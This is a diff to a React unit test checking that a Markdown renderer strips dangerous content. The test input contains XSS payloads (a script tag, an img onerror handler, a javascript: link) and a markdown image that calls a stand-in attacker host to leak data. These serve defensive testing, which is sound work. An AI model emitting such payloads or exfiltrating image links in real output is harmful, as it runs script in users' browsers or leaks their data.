@@ -68,20 +68,17 @@ describe("MarkdownContent with citations and sanitization", () => {
     expect(onSelect).toHaveBeenCalledWith(SAMPLE_CITATIONS[1]);
   });
 
-  it("sanitizes dangerous HTML and javascript URLs", () => {
+  it("drops external images and sanitizes dangerous HTML and javascript URLs (SEC-4)", () => {
     const { container } = render(
       <MarkdownContent
         content={
-          'Safe text <script>window.__xss=1</script><img src="x" onerror="alert(1)" /> [click](javascript:alert(1))'
+          'Safe text ![leak](https://attacker.example/leak?x=1) <script>window.__xss=1</script><img src="https://evil.example/x.png" onerror="alert(1)" /> [click](javascript:alert(1))'
         }
       />,
     );
 
+    expect(container.querySelector("img")).toBeNull();
     expect(container.querySelector("script")).toBeNull();
-    const img = container.querySelector("img");
-    if (img) {
-      expect(img.getAttribute("onerror")).toBeNull();
-    }
     const link = container.querySelector("a");
     if (link) {
       expect(link.getAttribute("href") ?? "").not.toContain("javascript:");
